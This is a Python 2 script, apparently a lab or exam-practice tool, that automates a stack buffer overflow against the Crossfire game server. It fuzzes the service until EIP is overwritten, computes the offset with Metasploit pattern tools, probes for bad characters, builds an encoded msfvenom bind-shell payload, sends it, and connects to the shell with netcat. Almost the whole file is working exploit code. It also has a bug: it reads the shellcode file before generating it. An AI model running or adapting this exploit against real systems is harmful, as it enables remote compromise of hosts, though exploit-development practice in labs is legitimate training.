#!/usr/bin/python
import socket, sys
import os
import time #make fuzzing more robust (sticky note)
os.system("figlet autoBOF") #Optional but very important dependency
host = "127.0.0.1"
port = 13327
buffer = ('\x41')
start = "\x11(setup sound "
end = "\x90\x00#"
isSuccess = False
overflow = buffer
max = sys.argv[1]
tryUntil = int(max)
startCount = 4368
increment = 1
print "---- Attempting to Crash Service ----"
while(startCount < tryUntil and isSuccess == False):
 try:
  s = socket.socket()
  s.connect((host, port))
  data = s.recv(1024)
  startCount = startCount + increment
  print "fuzzing at", startCount, "bytes", "out of", tryUntil #DEBUG
  overflow = start + (buffer * startCount) + end
  s.send(overflow)
  s.close()
  time.sleep(1)
  bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
  eipValue = bufFile.read()
  if("0x41414141" in eipValue):
   print "---- Service Crashed With EIP overwrite ----"
   print "!! Overflow at",startCount,"bytes"
   isSuccess = True
 except socket.error, e:
  bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
  eipValue = bufFile.read()
  if("0x41414141" in eipValue):
   print "---- Service Crashed With EIP overwrite ----"
   print "!! Overflow at",startCount,"bytes"
   isSuccess = True
  break
#s.close() #original
if(not isSuccess):
 print "---- Service is Resilient  ----"
 print("No overflow up to"),tryUntil,"bytes"
 sys.exit()

#END OVERFLOW DETECTION
print("--- Generating Unique Buffer ---")
bashCommand = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l "
strTest = str(startCount) #EDIT BACK TO INCREMENT
bashCommand = bashCommand + strTest + " > offsetStr.txt"
os.system(bashCommand)
bufFile = open("offsetStr.txt", "r")
newBuffer = bufFile.read()
newBuffer = newBuffer.strip('\n')
newBuffer = start + newBuffer + end
#copied code section
s = socket.socket()
s.connect((host, port))
s.send(newBuffer)
bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
eipValue = bufFile.read()
print("Unique Buffer Sent")
print("--- Attempting EIP overwrite ---")
bashCommand = "rm offsetStr.txt"
os.system(bashCommand)
s.close()
time.sleep(1)
bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
eipValue = bufFile.read()
startValue = eipValue.find("0x")
eipValue = eipValue[startValue:(startValue+10)]
print ("EIP overwrite successful")
bashCommand = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l " + strTest + " -q " + eipValue
os.system(bashCommand + " > offset.txt")
bufFile = open("offset.txt")
offset = bufFile.read()
startValue = offset.find("offset")+7
offset = offset[startValue:]
offset = offset.strip('\n')
offset = int(offset)
shellSpace = startCount - offset
print "Offset is at", offset, "bytes with", (shellSpace), "bytes of post-offset shellcode space"

########## Bad Character Phase ##########
print '--- Bad Character Detection Phase ---'
#removed 00, 0A, OD, FF as common bad characters. TODO add flag to test for common bad chars
badchars_hex = ["\x00", "\x0a", "\x0d", "\xff"]
badchars_text = ["00","0a","0d","ff"]
allchars_hex = ["\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0b","\x0c","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe"]
allchars_text = ["01","02","03","04","05","06","07","08","09","0b","0c","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe"]
bufCount = 0
allchars_unsure_hex = []
allchars_unsure_text = []
while(len(allchars_hex) > 4): #don't forget to move remainder to unsure 
 section_hex = allchars_hex[3] + allchars_hex[2] + allchars_hex[1] + allchars_hex[0]
 section_text = allchars_text[0] + allchars_text[1] + allchars_text[2] + allchars_text[3]
 bufCount = bufCount + 1
 section_text = section_text.replace("\\", "")
 section_text = section_text.replace("x", "")
 section_text = "0x" + section_text
 #print section_hex, "Section to be sent"
 #print section_text, "Section being searched for in memory"
 newBuffer = start + "BBBB" + section_hex + ("\x41" * (offset-8)) + "CCCC" + (shellSpace * "/x41") + end

 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 print "sending badchar detection buffer number", bufCount
 time.sleep(1)
 bufFile = open("/usr/games/crossfire/bin/badchars.txt", "r")
 badData = bufFile.read()

 firstEggLocation = badData.find("0x42424242") + 11
 lastEggLocation = badData.find("0x41414141")
 badData = badData[firstEggLocation:lastEggLocation]
 print "-----stack------"
 print badData
 print "------------------"

 if(section_text in badData):
  allchars_text = allchars_text[4:]
  allchars_hex = allchars_hex[4:]
  continue
 else:
  print "BAD CHARACTER DETECTED IN ", section_text
  #move to unsure variabless
  allchars_unsure_text =  allchars_unsure_text + allchars_text[:4]
  allchars_unsure_hex =  allchars_unsure_hex + allchars_hex[:4]
  allchars_text = allchars_text[4:]
  allchars_hex = allchars_hex[4:]

allchars_unsure_hex = allchars_unsure_hex + allchars_hex
allchars_unsure_text = allchars_unsure_text + allchars_text
print "unsure values are", allchars_unsure_text
print "---Verifying Bad Characters ---"
#Final Badchar Verification Phase
while(len(allchars_unsure_hex) > 0):
 section_hex = "\x41" + "\x41" + "\x41" + allchars_unsure_hex[0]
 section_text = allchars_unsure_text[0] + "414141"
 section_text = section_text.replace("\\", "")
 section_text = section_text.replace("x", "")
 section_text = "0x" + section_text
 print section_text, "Section being searched for in memory"
 newBuffer = start + "BBBB" + section_hex + ("\x41" * (offset-8)) + "CCCC" + (shellSpace * "/x41") + end

 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 time.sleep(1)
 bufFile = open("/usr/games/crossfire/bin/badchars.txt", "r")
 badData = bufFile.read()

 firstEggLocation = badData.find("0x42424242") + 11
 lastEggLocation = badData.find("0x41414141")
 badData = badData[firstEggLocation:lastEggLocation]

 print "-----stack------"
 print badData
 print "------------------"

 if(section_text in badData):
  allchars_unsure_hex = allchars_unsure_hex[1:]
  allchars_unsure_text = allchars_unsure_text[1:]
 else:
  print "BADCHAR VERIFIED:", allchars_unsure_text[0]
  badchars_hex.append(allchars_unsure_hex[0])
  badchars_text.append(allchars_unsure_text[0])
  allchars_unsure_hex = allchars_unsure_hex[1:]
  allchars_unsure_text = allchars_unsure_text[1:]
  continue

print "Badchar Detection Complete!"
print "Bad Characters:", badchars_text

print "Acquiring JMP ESP..."
bufFile = open("/usr/games/crossfire/bin/jmpSearch.txt", "r")
jmpData = bufFile.read()
jmpData = '\n'.join(jmpData.split('\n')[1:]) 

offset1 = jmpData[8:10].decode("hex")
offset2 = jmpData[6:8].decode("hex")
offset3 = jmpData[4:6].decode("hex")
offset4 = jmpData[2:4].decode("hex")
eipString = offset1 + offset2 + offset3 + offset4
#data after offset found from nasm_shell.rb, need to jump to after beggining input of setup sound.
#find a way to make this dynamic TODO
badlist = ""
while (len(badchars_text) > 0):
 badlist = badlist + badchars_text[0]
 badchars_text.pop(0)
print "--- Building Payload ---"
badlist = "\\x" + badlist[0:2] + "\\x" + badlist[2:4] + "\\x" + badlist[4:6] + "\\x" + badlist[6:8]
bashCommand = "msfvenom -p linux/x86/shell_bind_tcp LPORT=4444" + " -f raw -b \"" + badlist + "\" -e x86/shikata_ga_nai -o shellcode.txt"
bufFile = open("shellcode.txt", "r")
shellcode = bufFile.read()
os.system(bashCommand)
newBuffer = start + shellcode + ("\x41" * (offset-len(shellcode))) + eipString + ("\x83\xc0\x0c\xff\xe0\x90\x90") + end
print "----------------------"
print "Deploying Payload..."
s = socket.socket()
s.connect((host, port))
s.send(newBuffer)
print("Target Machine Compromised!")
print("--- Initiating Bind Shell Connection ---")
time.sleep(1)
os.system("nc -v 127.0.0.1 4444")
